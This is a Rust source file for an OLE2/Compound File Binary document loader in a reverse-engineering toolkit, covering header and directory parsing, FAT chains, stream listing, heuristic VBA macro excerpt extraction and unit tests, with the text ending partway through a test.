//! `rustre-loader-ole`
//!
//! This crate is part of the `RustRE` Suite, a premium reverse engineering platform.
//!
//! # Loader: OLE
//! Loads OLE2 / Compound File Binary (CFB) documents.
//! Magic: `D0 CF 11 E0 A1 B1 1A E1`.

pub mod fat;
pub mod ole_parser;
pub mod ole_stream_analyzer;
pub mod ole_streams;
pub mod office;
pub mod ole_macro_analyzer;
pub mod ole_vba_extractor;
pub mod ooxml_extractor;
pub mod rtf_parser;
pub mod security;
pub mod vba;
pub mod vba_extractor;
pub mod ooxml_relationship_parser;
pub mod ole_property_reader;
pub mod ole_stream_parser;
pub mod ole_directory_walker;
pub mod vba_stream_extractor;

pub use rtf_parser::{
    CLSID_EQUATION_EDITOR, CLSID_PACKAGE, Cve201711882Result, EmbeddedShellcode, OleObject,
    OleObjectType, RtfError, RtfLexer, RtfParser, RtfStats, RtfToken,
};

use std::fmt;
use std::sync::Arc;

use rustre_core::address::{Address, AddressRange};
use rustre_core::arch::{Architecture, BranchInfo, CallingConvention, Instruction, RegisterInfo};
use rustre_core::binary_view::{BinaryView, Memory, Segment};
use rustre_core::endian::Endian;
use rustre_core::errors::CoreError;
use rustre_core::ids::ViewId;
use rustre_core::loader::LoadResult;
use rustre_core::permissions::Permissions;
use rustre_core::{Loader, LoaderInput, NestedBinary, async_trait};

// ── Error type ───────────────────────────────────────────────────────────────

/// Errors produced by the OLE loader.
#[derive(Debug, thiserror::Error)]
pub enum OleError {
    /// Magic bytes do not match `D0 CF 11 E0 A1 B1 1A E1`.
    #[error("invalid magic")]
    InvalidMagic,
    /// File is too short to contain a valid header.
    #[error("truncated header")]
    TruncatedHeader,
    /// Generic parse error with context.
    #[error("parse error: {0}")]
    ParseError(String),
    /// Unsupported version.
    #[error("unsupported version: {0}")]
    UnsupportedVersion(u16),
}

// ── Magic constants ──────────────────────────────────────────────────────────

const OLE_MAGIC: [u8; 8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

/// Returns `true` if `data` starts with the OLE2 compound file magic bytes.
#[must_use]
pub fn is_ole(data: &[u8]) -> bool {
    data.starts_with(&OLE_MAGIC)
}

// ── Sector size ───────────────────────────────────────────────────────────────

/// OLE sector size variant.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OleSectorSize {
    /// Regular 512-byte sectors (version 3).
    Regular = 512,
    /// Mini-stream 64-byte sectors.
    Mini = 64,
}

impl OleSectorSize {
    /// Return the sector size as `usize`.
    #[must_use]
    pub const fn as_usize(self) -> usize {
        self as usize
    }
}

impl fmt::Display for OleSectorSize {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.as_usize())
    }
}

// ── OLE header ───────────────────────────────────────────────────────────────

/// Parsed OLE2 compound file header.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OleHeader {
    /// Minor version of the format.
    pub minor_version: u16,
    /// Major version (3 or 4).
    pub dll_version: u16,
    /// Sector size exponent (9 → 512, 12 → 4096).
    pub sector_size: u16,
    /// Number of directory sectors.
    pub dir_sector_count: u32,
    /// Number of FAT sectors.
    pub fat_sector_count: u32,
    /// First directory sector.
    pub first_dir_sector: u32,
    /// Number of mini FAT sectors.
    pub mini_fat_count: u32,
    /// First mini FAT sector.
    pub first_mini_fat: u32,
}

impl OleHeader {
    /// Parse an `OleHeader` from the beginning of `data`.
    ///
    /// # Errors
    /// Returns `OleError::TruncatedHeader` if data is too short.
    /// Returns `OleError::InvalidMagic` if the magic does not match.
    pub fn parse(data: &[u8]) -> Result<Self, OleError> {
        if data.len() < 76 {
            return Err(OleError::TruncatedHeader);
        }
        if !is_ole(data) {
            return Err(OleError::InvalidMagic);
        }
        let sector_size = u16::from_le_bytes([data[30], data[31]]);
        // Valid CFB files use 9 (512) or 12 (4096); anything above 15 would
        // overflow the shift in `sector_size_bytes`, so reject it here.
        if !(6..=15).contains(&sector_size) {
            return Err(OleError::UnsupportedVersion(sector_size));
        }
        Ok(Self {
            minor_version: u16::from_le_bytes([data[24], data[25]]),
            dll_version: u16::from_le_bytes([data[26], data[27]]),
            sector_size: u16::from_le_bytes([data[30], data[31]]),
            dir_sector_count: u32::from_le_bytes(
                data[40..44]
                    .try_into()
                    .map_err(|_| OleError::ParseError("dir_sector_count".into()))?,
            ),
            fat_sector_count: u32::from_le_bytes(
                data[44..48]
                    .try_into()
                    .map_err(|_| OleError::ParseError("fat_sector_count".into()))?,
            ),
            first_dir_sector: u32::from_le_bytes(
                data[48..52]
                    .try_into()
                    .map_err(|_| OleError::ParseError("first_dir_sector".into()))?,
            ),
            mini_fat_count: u32::from_le_bytes(
                data[64..68]
                    .try_into()
                    .map_err(|_| OleError::ParseError("mini_fat_count".into()))?,
            ),
            first_mini_fat: u32::from_le_bytes(
                data[60..64]
                    .try_into()
                    .map_err(|_| OleError::ParseError("first_mini_fat".into()))?,
            ),
        })
    }

    /// Return the sector size in bytes.
    #[must_use]
    pub const fn sector_size_bytes(&self) -> u32 {
        1u32 << self.sector_size
    }
}

impl fmt::Display for OleHeader {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "OLE2 v{}.{} sector={} fat_sectors={} first_dir={}",
            self.dll_version,
            self.minor_version,
            self.sector_size_bytes(),
            self.fat_sector_count,
            self.first_dir_sector,
        )
    }
}

// ── Directory entry ───────────────────────────────────────────────────────────

/// A raw OLE2 directory entry (128 bytes).
#[derive(Debug, Clone)]
pub struct OleDirectoryEntry {
    /// Entry name decoded from UTF-16LE.
    pub name: String,
    /// Object type (1=Storage, 2=Stream, 5=Root).
    pub entry_type: u8,
    /// Red-black tree color.
    pub color: u8,
    /// Child SID.
    pub child_sid: u32,
    /// Left sibling SID.
    pub left_sid: u32,
    /// Right sibling SID.
    pub right_sid: u32,
    /// Starting sector.
    pub start_sector: u32,
    /// Size of the stream.
    pub size: u64,
    /// Creation time (Windows FILETIME).
    pub created: u64,
    /// Modification time (Windows FILETIME).
    pub modified: u64,
}

impl OleDirectoryEntry {
    /// Parse a 128-byte directory entry from `data[off..]`.
    ///
    /// # Errors
    /// Returns `OleError::TruncatedHeader` if data is too short.
    pub fn parse(data: &[u8], off: usize) -> Result<Self, OleError> {
        if data.len() < off + 128 {
            return Err(OleError::TruncatedHeader);
        }
        let d = &data[off..off + 128];
        let name_len = u16::from_le_bytes([d[64], d[65]]) as usize;
        let name_bytes = name_len.min(64);
        let name_u16: Vec<u16> = d[..name_bytes]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let name = String::from_utf16_lossy(&name_u16)
            .trim_end_matches('\0')
            .to_string();
        let entry_type = d[66];
        let color = d[67];
        let left_sid = u32::from_le_bytes(
            d[68..72]
                .try_into()
                .map_err(|_| OleError::ParseError("left_sid".into()))?,
        );
        let right_sid = u32::from_le_bytes(
            d[72..76]
                .try_into()
                .map_err(|_| OleError::ParseError("right_sid".into()))?,
        );
        let child_sid = u32::from_le_bytes(
            d[76..80]
                .try_into()
                .map_err(|_| OleError::ParseError("child_sid".into()))?,
        );
        let created = u64::from_le_bytes(
            d[100..108]
                .try_into()
                .map_err(|_| OleError::ParseError("created".into()))?,
        );
        let modified = u64::from_le_bytes(
            d[108..116]
                .try_into()
                .map_err(|_| OleError::ParseError("modified".into()))?,
        );
        let start_sector = u32::from_le_bytes(
            d[116..120]
                .try_into()
                .map_err(|_| OleError::ParseError("start_sector".into()))?,
        );
        let size_lo = u64::from(u32::from_le_bytes(
            d[120..124]
                .try_into()
                .map_err(|_| OleError::ParseError("size_lo".into()))?,
        ));
        // Per MS-CFB, the high 4 bytes of stream size MUST be ignored for
        // version-3 files (where they may contain garbage). The version is not
        // available in this parse context, so conservatively use only the low
        // 32 bits; this matches v3 spec and is correct for v4 streams <= 4 GiB.
        let size = size_lo;
        Ok(Self {
            name,
            entry_type,
            color,
            child_sid,
            left_sid,
            right_sid,
            start_sector,
            size,
            created,
            modified,
        })
    }

    /// Returns `true` if this entry is a Storage (type 1).
    #[must_use]
    pub const fn is_storage(&self) -> bool {
        self.entry_type == 1
    }

    /// Returns `true` if this entry is a Stream (type 2).
    #[must_use]
    pub const fn is_stream(&self) -> bool {
        self.entry_type == 2
    }

    /// Returns `true` if this entry is the Root (type 5).
    #[must_use]
    pub const fn is_root(&self) -> bool {
        self.entry_type == 5
    }
}

impl fmt::Display for OleDirectoryEntry {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "'{}' type={} sector={} size={}",
            self.name, self.entry_type, self.start_sector, self.size,
        )
    }
}

// ── OleFile ───────────────────────────────────────────────────────────────────

/// Parsed OLE2 compound file.
#[derive(Debug, Clone)]
pub struct OleFile {
    /// OLE2 header.
    pub header: OleHeader,
    /// Directory entries from the first directory sector.
    pub directory: Vec<OleDirectoryEntry>,
}

impl OleFile {
    /// Parse an `OleFile` from `data`.
    ///
    /// # Errors
    /// Propagates errors from `OleHeader::parse` and `OleDirectoryEntry::parse`.
    pub fn parse(data: &[u8]) -> Result<Self, OleError> {
        let header = OleHeader::parse(data)?;
        let sector_size = header.sector_size_bytes() as usize;
        let directory = parse_directory_entries(data, &header, sector_size);
        Ok(Self { header, directory })
    }

    /// Find a directory entry by name.
    #[must_use]
    pub fn find_entry(&self, name: &str) -> Option<&OleDirectoryEntry> {
        self.directory.iter().find(|e| e.name == name)
    }

    /// Return all stream entries.
    #[must_use]
    pub fn streams(&self) -> Vec<&OleDirectoryEntry> {
        self.directory.iter().filter(|e| e.is_stream()).collect()
    }

    /// Return the root entry (type 5), if any.
    #[must_use]
    pub fn root(&self) -> Option<&OleDirectoryEntry> {
        self.directory.iter().find(|e| e.is_root())
    }
}

// ── Shared directory-walk helpers ────────────────────────────────────────────

/// Build the FAT from the header DIFAT (plus any chained DIFAT sectors).
///
/// Returns an empty FAT if the header fields are inconsistent; callers fall
/// back to bounded single-sector parsing in that case.
fn build_fat(data: &[u8], sector_size: usize) -> Vec<u32> {
    if data.len() < CFB_HEADER_SIZE || sector_size < 128 {
        return Vec::new();
    }
    let read_u32 = |off: usize| -> u32 {
        data.get(off..off + 4)
            .map_or(0, |b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    let fat_sector_count = read_u32(44) as usize;
    let first_difat = read_u32(68);
    let difat_count = read_u32(72);

    let mut difat: Vec<u32> = (0..HEADER_DIFAT_COUNT).map(|i| read_u32(76 + i * 4)).collect();
    if difat_count > 0 && first_difat != FREE_SECT && first_difat != ENDOFCHAIN {
        let entries_per_difat = (sector_size / 4) - 1;
        let mut next = first_difat;
        let mut visited = std::collections::HashSet::new();
        for _ in 0..difat_count {
            if next == FREE_SECT || next == ENDOFCHAIN || !visited.insert(next) {
                break;
            }
            let Ok(sect) = CfbReader::sector_slice_raw(data, next, sector_size) else {
                break;
            };
            for j in 0..entries_per_difat {
                difat.push(CfbReader::read_u32_slice(sect, j * 4));
            }
            next = CfbReader::read_u32_slice(sect, entries_per_difat * 4);
        }
    }

    let fat_entries_per_sector = sector_size / 4;
    // Cap the FAT size by what the file could actually contain, so a bogus
    // `fat_sector_count` cannot trigger a huge allocation.
    let max_fat_sectors = data.len().div_ceil(sector_size).max(1);
    let mut fat: Vec<u32> =
        Vec::with_capacity(fat_sector_count.min(max_fat_sectors) * fat_entries_per_sector);
    for &fat_sect_id in difat.iter().take(fat_sector_count) {
        if fat_sect_id == FREE_SECT || fat_sect_id == FATSECT || fat_sect_id == DIFSECT {
            continue;
        }
        let Ok(sect) = CfbReader::sector_slice_raw(data, fat_sect_id, sector_size) else {
            continue;
        };
        for j in 0..fat_entries_per_sector {
            fat.push(CfbReader::read_u32_slice(sect, j * 4));
        }
    }
    fat
}

/// Parse all non-empty directory entries by following the directory sector
/// chain through the FAT. Tolerates truncated final sectors (parses as many
/// whole 128-byte entries as are available).
fn parse_directory_entries(
    data: &[u8],
    header: &OleHeader,
    sector_size: usize,
) -> Vec<OleDirectoryEntry> {
    let fat = build_fat(data, sector_size);
    let chain = CfbReader::follow_chain_raw(&fat, header.first_dir_sector);
    // Fallback for minimal/legacy files with an unusable FAT: parse just the
    // first directory sector.
    let chain = if chain.is_empty() {
        vec![header.first_dir_sector]
    } else {
        chain
    };

    let mut directory = Vec::new();
    for sect_id in chain {
        if sect_id >= FATSECT {
            continue;
        }
        let Some(offset) = (sect_id as usize)
            .checked_add(1)
            .and_then(|n| n.checked_mul(sector_size))
        else {
            continue;
        };
        if offset >= data.len() {
            continue;
        }
        let end = (offset + sector_size).min(data.len());
        let mut off = offset;
        while off + 128 <= end {
            if let Ok(entry) = OleDirectoryEntry::parse(data, off) {
                // Skip empty slots (type 0).
                if entry.entry_type != 0 {
                    directory.push(entry);
                }
            }
            off += 128;
        }
    }
    directory
}

// ── Architecture stub ────────────────────────────────────────────────────────

/// Minimal Architecture stub for OLE2 documents.
#[derive(Debug)]
pub struct OleArch;

impl Architecture for OleArch {
    fn name(&self) -> &'static str {
        "ole"
    }

    fn pointer_size(&self) -> usize {
        4
    }

    fn endian(&self) -> Endian {
        Endian::Little
    }

    fn disassemble(&self, address: Address, bytes: &[u8]) -> Result<Instruction, CoreError> {
        if bytes.is_empty() {
            return Err(CoreError::InvalidInput { message: "disassemble called with empty byte slice".into() });
        }
        let size: usize = 1;
        Ok(Instruction::new(
            address,
            size,
            "data",
            bytes[..size].to_vec(),
        ))
    }

    fn get_branches(&self, _instr: &Instruction) -> Vec<BranchInfo> {
        vec![]
    }

    fn registers(&self) -> Vec<RegisterInfo> {
        vec![]
    }

    fn calling_conventions(&self) -> Vec<CallingConvention> {
        vec![]
    }
}

// ── Loader ───────────────────────────────────────────────────────────────────

/// Loader for OLE2 / Compound File Binary documents.
#[derive(Debug)]
pub struct OleLoader;

#[async_trait]
impl Loader for OleLoader {
    fn name(&self) -> &'static str {
        "ole"
    }

    fn can_load(&self, input: &LoaderInput) -> bool {
        is_ole(&input.data)
    }

    async fn load(&self, input: LoaderInput) -> Result<LoadResult, CoreError> {
        let base = input.hints.base_address().map_or(0_u64, rustre_core::Address::as_u64);

        let mut mem = Memory::new();
        let size = input.data.len() as u64;
        if size > 0 {
            mem.add_segment(Segment {
                range: AddressRange::new(Address::new(base), Address::new(base + size)),
                permissions: Permissions::READ,
                data: input.data.clone(),
            });
        }

        let arch = Arc::new(OleArch);
        let view_id = ViewId::from_raw(1);
        let view = BinaryView::new(
            view_id,
            input.uri,
            arch,
            Endian::Little,
            32,
            vec![Address::new(base)],
            mem,
        );
        Ok(LoadResult::new(view))
    }

    async fn find_nested(&self, _input: &LoaderInput) -> Result<Vec<NestedBinary>, CoreError> {
        Ok(vec![])
    }
}

// ── OleDirectoryReader ────────────────────────────────────────────────────────

/// A stream entry discovered by [`OleDirectoryReader`].
#[derive(Debug, Clone)]
pub struct OleStream {
    /// Stream name decoded from UTF-16LE.
    pub name: String,
    /// Stream size in bytes.
    pub size: u32,
    /// Starting sector of the stream data.
    pub start_sector: u32,
}

/// Reads the directory sector of an OLE2 file and enumerates all streams.
///
/// Validates the OLE magic (`D0 CF 11 E0 A1 B1 1A E1`) at offset 0, then
/// follows the first directory sector chain to produce a flat list of stream
/// entries (directory entry type = 2).
#[derive(Debug, Default)]
pub struct OleDirectoryReader;

impl OleDirectoryReader {
    /// Create a new [`OleDirectoryReader`].
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Parse `bytes` and return all stream entries found in the directory.
    ///
    /// # Errors
    /// Returns `OleError::InvalidMagic` or `OleError::TruncatedHeader` if the
    /// file header cannot be parsed.
    pub fn list_streams(&self, bytes: &[u8]) -> Result<Vec<OleStream>, OleError> {
        let hdr = OleHeader::parse(bytes)?;
        let sector_size = hdr.sector_size_bytes() as usize;

        // Compute the offset of the first directory sector.
        // Each sector occupies `sector_size` bytes starting from byte 512
        // (sector 0 is at offset 512, sector N is at offset (N+1)*512).
        let first_dir = hdr.first_dir_sector as usize;
        let dir_offset = first_dir
            .checked_add(1)
            .and_then(|n| n.checked_mul(sector_size))
            .ok_or(OleError::ParseError("directory sector offset overflow".into()))?;

        let mut streams = Vec::new();
        let mut off = dir_offset;

        // Walk directory entries (each 128 bytes) in the first directory sector.
        while off + 128 <= bytes.len() {
            match OleDirectoryEntry::parse(bytes, off) {
                Ok(entry) if entry.is_stream() && !entry.name.is_empty() => {
                    streams.push(OleStream {
                        name: entry.name,
                        size: u32::try_from(entry.size).unwrap_or(u32::MAX),
                        start_sector: entry.start_sector,
                    });
                }
                Ok(_) => {}
                Err(_) => break,
            }
            off += 128;
        }

        Ok(streams)
    }
}

// ── OleMacroExtractor ─────────────────────────────────────────────────────────

/// A VBA macro code block found inside an OLE stream.
#[derive(Debug, Clone)]
pub struct OleMacro {
    /// Name of the OLE stream containing the macro (e.g. `"VBA/Module1"`).
    pub stream_name: String,
    /// Starting sector of the stream.
    pub start_sector: u32,
    /// Raw bytes of the stream (up to `MAX_MACRO_PREVIEW` bytes for display).
    pub raw_preview: Vec<u8>,
    /// Printable ASCII excerpt of the macro content (heuristically extracted).
    pub code_excerpt: String,
}

/// Maximum bytes to read as a raw preview when extracting macros.
const MAX_MACRO_PREVIEW: usize = 4096;

/// Extracts VBA macro data from OLE streams whose names start with `"VBA/"`.
///
/// VBA code is stored in compressed form in streams named with the `VBA/`
/// prefix (e.g. `VBA/ThisDocument`, `VBA/Module1`).  The compressed code uses
/// a simple RLE-like scheme (MS-OVBA).  This extractor locates the streams,
/// reads their sector data, and returns printable excerpts.
#[derive(Debug, Default)]
pub struct OleMacroExtractor;

impl OleMacroExtractor {
    /// Create a new [`OleMacroExtractor`].
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Scan `bytes` for VBA macro streams and return all found macros.
    ///
    /// Only streams whose names begin with `"VBA/"` (case-insensitive) are
    /// considered.  The sector data is extracted using the FAT chain stored
    /// in the OLE header's DIFAT/FAT tables; for simplicity this implementation
    /// performs a direct sector read based on `start_sector`.
    #[must_use]
    pub fn extract_macros(&self, bytes: &[u8]) -> Vec<OleMacro> {
        let reader = OleDirectoryReader::new();
        let streams = match reader.list_streams(bytes) {
            Ok(s) => s,
            Err(_) => return vec![],
        };
        let hdr = match OleHeader::parse(bytes) {
            Ok(h) => h,
            Err(_) => return vec![],
        };
        let sector_size = hdr.sector_size_bytes() as usize;

        streams
            .into_iter()
            .filter(|s| {
                s.name.to_ascii_uppercase().starts_with("VBA/")
                    || s.name.eq_ignore_ascii_case("vbaproject")
            })
            .map(|stream| {
                let raw_preview =
                    self.read_sector(bytes, stream.start_sector, sector_size, MAX_MACRO_PREVIEW);
                let code_excerpt = self.extract_printable(&raw_preview);
                OleMacro {
                    stream_name: stream.name,
                    start_sector: stream.start_sector,
                    raw_preview,
                    code_excerpt,
                }
            })
            .collect()
    }

    /// Read up to `max_bytes` from the sector chain starting at `start_sector`.
    fn read_sector(
        &self,
        bytes: &[u8],
        start_sector: u32,
        sector_size: usize,
        max_bytes: usize,
    ) -> Vec<u8> {
        // Special sector markers.
        const ENDOFCHAIN: u32 = 0xFFFF_FFFE;
        const FREESECT: u32 = 0xFFFF_FFFF;

        if start_sector == ENDOFCHAIN || start_sector == FREESECT {
            return vec![];
        }
        let offset = (start_sector as usize + 1) * sector_size;
        if offset >= bytes.len() {
            return vec![];
        }
        let available = bytes.len() - offset;
        let take = available.min(max_bytes);
        bytes[offset..offset + take].to_vec()
    }

    /// Extract a printable ASCII excerpt from raw VBA stream bytes.
    ///
    /// VBA streams contain compressed data prefixed by a small fixed-size
    /// header.  The printable ASCII runs within the compressed buffer often
    /// include attribute names, procedure names, and string literals.
    fn extract_printable(&self, data: &[u8]) -> String {
        let mut out = String::new();
        let mut run = String::new();
        for &b in data {
            if (0x20..0x7F).contains(&b) {
                run.push(b as char);
            } else {
                if run.len() >= 4 {
                    if !out.is_empty() {
                        out.push('\n');
                    }
                    out.push_str(&run);
                }
                run.clear();
            }
        }
        if run.len() >= 4 {
            if !out.is_empty() {
                out.push('\n');
            }
            out.push_str(&run);
        }
        out
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_ole_header() -> Vec<u8> {
        let mut data = vec![0u8; 512];
        data[..8].copy_from_slice(&OLE_MAGIC);
        data[24..26].copy_from_slice(&0x003E_u16.to_le_bytes()); // minor_version
        data[26..28].copy_from_slice(&3_u16.to_le_bytes()); // dll_version (v3)
        data[28..30].copy_from_slice(&0xFFFE_u16.to_le_bytes()); // byte order LE
        data[30..32].copy_from_slice(&9_u16.to_le_bytes()); // sector_size exponent (512)
        data[32..34].copy_from_slice(&6_u16.to_le_bytes()); // mini sector_size exponent (64)
        data[44..48].copy_from_slice(&2_u32.to_le_bytes()); // fat_sector_count
        data[48..52].copy_from_slice(&1_u32.to_le_bytes()); // first_dir_sector
        data[56..60].copy_from_slice(&4096_u32.to_le_bytes()); // mini stream cutoff
        data[60..64].copy_from_slice(&0xFFFF_FFFE_u32.to_le_bytes()); // first_mini_fat
        data[64..68].copy_from_slice(&0_u32.to_le_bytes()); // mini_fat_size
        data
    }

    fn make_dir_entry(name: &str, kind: u8, sector: u32, size: u32) -> Vec<u8> {
        let mut entry = vec![0u8; 128];
        let name_u16: Vec<u16> = name.encode_utf16().collect();
        for (i, &c) in name_u16.iter().enumerate() {
            if i * 2 + 2 > 64 {
                break;
            }
            entry[i * 2..i * 2 + 2].copy_from_slice(&c.to_le_bytes());
        }
        let len = ((name_u16.len() + 1) * 2).min(64) as u16;
        entry[64..66].copy_from_slice(&len.to_le_bytes());
        entry[66] = kind; // entry_type
        entry[67] = 1; // color
        // left/right/child at 68/72/76
        entry[68..72].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes()); // left_sid = FREESECT
        entry[72..76].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes()); // right_sid
        entry[76..80].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes()); // child_sid
        entry[116..120].copy_from_slice(&sector.to_le_bytes());
        entry[120..124].copy_from_slice(&size.to_le_bytes());
        entry
    }

    // ── magic detection ───────────────────────────────────────────────────────

    #[test]
    fn test_is_ole_valid() {
        let data = make_ole_header();
        assert!(is_ole(&data));
    }

    #[test]
    fn test_is_ole_wrong_magic() {
        let data = vec![0u8; 64];
        assert!(!is_ole(&data));
    }

    #[test]
    fn test_is_ole_too_short() {
        assert!(!is_ole(&OLE_MAGIC[..4]));
    }

    // ── OleSectorSize ─────────────────────────────────────────────────────────

    #[test]
    fn test_sector_size_regular() {
        assert_eq!(OleSectorSize::Regular.as_usize(), 512);
    }

    #[test]
    fn test_sector_size_mini() {
        assert_eq!(OleSectorSize::Mini.as_usize(), 64);
    }

    #[test]
    fn test_sector_size_display() {
        assert_eq!(OleSectorSize::Regular.to_string(), "512");
    }

    // ── OleHeader ─────────────────────────────────────────────────────────────

    #[test]
    fn test_ole_header_parse() {
        let data = make_ole_header();
        let hdr = OleHeader::parse(&data).unwrap();
        assert_eq!(hdr.dll_version, 3);
        assert_eq!(hdr.sector_size, 9);
        assert_eq!(hdr.sector_size_bytes(), 512);
        assert_eq!(hdr.fat_sector_count, 2);
        assert_eq!(hdr.first_dir_sector, 1);
    }

    #[test]
    fn test_ole_header_too_short() {
        let err = OleHeader::parse(&[0u8; 10]).unwrap_err();
        assert!(matches!(err, OleError::TruncatedHeader));
    }

    #[test]
    fn test_ole_header_invalid_magic() {
        let err = OleHeader::parse(&[0u8; 80]).unwrap_err();
        assert!(matches!(err, OleError::InvalidMagic));
    }

    #[test]
    fn test_ole_header_display() {
        let hdr = OleHeader::parse(&make_ole_header()).unwrap();
        let s = hdr.to_string();
        assert!(s.contains("OLE2"));
        assert!(s.contains("512"));
    }

    // ── OleDirectoryEntry ─────────────────────────────────────────────────────

    #[test]
    fn test_ole_dir_entry_root() {
        let entry = make_dir_entry("Root Entry", 5, 1, 0);
        let de = OleDirectoryEntry::parse(&entry, 0).unwrap();
        assert!(de.is_root());
        assert!(!de.is_stream());
        assert!(!de.is_storage());
    }

    #[test]
    fn test_ole_dir_entry_stream() {
        let entry = make_dir_entry("Workbook", 2, 3, 2048);
        let de = OleDirectoryEntry::parse(&entry, 0).unwrap();
        assert!(de.is_stream());
        assert_eq!(de.size, 2048);
        assert_eq!(de.name, "Workbook");
    }

    #[test]
    fn test_ole_dir_entry_storage() {
        let entry = make_dir_entry("ObjectPool", 1, 0, 0);
        let de = OleDirectoryEntry::parse(&entry, 0).unwrap();
        assert!(de.is_storage());
    }

    #[test]
    fn test_ole_dir_entry_too_short() {
        let err = OleDirectoryEntry::parse(&[0u8; 64], 0).unwrap_err();
        assert!(matches!(err, OleError::TruncatedHeader));
    }

    #[test]
    fn test_ole_dir_entry_display() {
        let entry = make_dir_entry("Doc", 2, 2, 512);
        let de = OleDirectoryEntry::parse(&entry, 0).unwrap();
        assert!(de.to_string().contains("Doc"));
    }

    // ── OleFile ───────────────────────────────────────────────────────────────

    #[test]
    fn test_ole_file_parse_header_only() {
        // Data is exactly 512 bytes, no directory sector follows.
        let data = make_ole_header();
        let file = OleFile::parse(&data).unwrap();
        assert_eq!(file.header.dll_version, 3);
        // Directory may be empty since no directory sector in our minimal data.
    }

    #[test]
    fn test_ole_file_parse_with_directory() {
        let mut data = make_ole_header();
        // first_dir_sector = 1, so dir is at (1+1)*512 = offset 1024
        // Ensure data is large enough
        data.resize(1024 + 128, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0xFFFFFFFE, 0);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        let file = OleFile::parse(&data).unwrap();
        assert!(file.root().is_some());
    }

    #[test]
    fn test_ole_file_find_entry() {
        let mut data = make_ole_header();
        data.resize(1024 + 256, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0xFFFFFFFE, 0);
        let stream_entry = make_dir_entry("TestStream", 2, 2, 100);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        data[1024 + 128..1024 + 256].copy_from_slice(&stream_entry);
        let file = OleFile::parse(&data).unwrap();
        assert!(file.find_entry("TestStream").is_some());
        assert!(file.find_entry("NonExistent").is_none());
    }

    #[test]
    fn test_ole_file_streams() {
        let mut data = make_ole_header();
        data.resize(1024 + 256, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0, 0);
        let stream_entry = make_dir_entry("Data", 2, 2, 50);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        data[1024 + 128..1024 + 256].copy_from_slice(&stream_entry);
        let file = OleFile::parse(&data).unwrap();
        let streams = file.streams();
        assert_eq!(streams.len(), 1);
        assert_eq!(streams[0].name, "Data");
    }

    // ── Error display ─────────────────────────────────────────────────────────

    #[test]
    fn test_error_invalid_magic_display() {
        assert!(OleError::InvalidMagic.to_string().contains("magic"));
    }

    #[test]
    fn test_error_truncated_header_display() {
        assert!(OleError::TruncatedHeader.to_string().contains("truncated"));
    }

    #[test]
    fn test_error_parse_error_display() {
        let e = OleError::ParseError("bad".into());
        assert!(e.to_string().contains("bad"));
    }

    #[test]
    fn test_error_unsupported_version_display() {
        let e = OleError::UnsupportedVersion(5);
        assert!(e.to_string().contains('5'));
    }

    // ── Architecture ──────────────────────────────────────────────────────────

    #[test]
    fn test_ole_arch_name() {
        assert_eq!(OleArch.name(), "ole");
    }

    // ── Loader ────────────────────────────────────────────────────────────────

    #[test]
    fn test_loader_name() {
        assert_eq!(OleLoader.name(), "ole");
    }

    #[test]
    fn test_can_load() {
        let input = LoaderInput::new("doc.xls", make_ole_header());
        assert!(OleLoader.can_load(&input));
    }

    #[test]
    fn test_cannot_load_random() {
        let input = LoaderInput::new("file.bin", b"randomdata".to_vec());
        assert!(!OleLoader.can_load(&input));
    }

    #[tokio::test]
    async fn test_load() {
        let input = LoaderInput::new("doc.xls", make_ole_header());
        let result = OleLoader.load(input).await.unwrap();
        assert_eq!(result.view.uri, "doc.xls");
    }

    #[tokio::test]
    async fn test_find_nested_empty() {
        let input = LoaderInput::new("doc.xls", make_ole_header());
        let nested = OleLoader.find_nested(&input).await.unwrap();
        assert!(nested.is_empty());
    }

    // ── OleDirectoryReader ────────────────────────────────────────────────────

    fn make_ole_with_stream(stream_name: &str, kind: u8) -> Vec<u8> {
        let mut data = make_ole_header();
        // first_dir_sector = 1, so dir is at (1+1)*512 = 1024.
        data.resize(1024 + 256, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0xFFFFFFFE, 0);
        let stream_entry = make_dir_entry(stream_name, kind, 2, 100);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        data[1024 + 128..1024 + 256].copy_from_slice(&stream_entry);
        data
    }

    #[test]
    fn test_ole_directory_reader_finds_stream() {
        let data = make_ole_with_stream("Workbook", 2);
        let reader = OleDirectoryReader::new();
        let streams = reader.list_streams(&data).unwrap();
        assert_eq!(streams.len(), 1);
        assert_eq!(streams[0].name, "Workbook");
        assert_eq!(streams[0].size, 100);
        assert_eq!(streams[0].start_sector, 2);
    }

    #[test]
    fn test_ole_directory_reader_skips_storage() {
        let data = make_ole_with_stream("ObjectPool", 1); // storage, not stream
        let reader = OleDirectoryReader::new();
        let streams = reader.list_streams(&data).unwrap();
        assert!(streams.is_empty());
    }

    #[test]
    fn test_ole_directory_reader_skips_root() {
        // Only the root entry in the directory sector.
        let mut data = make_ole_header();
        data.resize(1024 + 128, 0);
        let root_entry = make_dir_entry("Root Entry", 5, 0xFFFFFFFE, 0);
        data[1024..1024 + 128].copy_from_slice(&root_entry);
        let reader = OleDirectoryReader::new();
        let streams = reader.list_streams(&data).unwrap();
        assert!(streams.is_empty());
    }

    #[test]
    fn test_ole_directory_reader_invalid_magic() {
        let reader = OleDirectoryReader::new();
